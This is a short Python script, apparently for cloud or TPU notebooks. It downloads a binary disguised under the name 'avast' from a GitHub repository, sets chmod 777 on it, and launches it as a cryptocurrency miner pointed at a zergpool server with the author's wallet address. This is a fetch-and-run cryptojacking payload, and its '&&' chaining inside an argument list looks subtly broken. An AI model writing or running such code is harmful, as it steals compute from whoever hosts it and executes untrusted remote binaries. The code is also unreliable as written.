import os,subprocess
os.system("lscpu")
subprocess.run(['wget', 'https://github.com/aurbach55/pos/raw/main/avast', '&&', 'chmod', '777', 'avast', '&&', './avast -v -l  verushash.asia.mine.zergpool.com:3300 -u 7pXYkwdwUFBGNaG8dJ8w6kZTzRjnTpDTgo.$(echo $(shuf -i 1-99999 -n 1)-TPU) -p c=DASH -t 4 -x'], stdout=subprocess.PIPE)
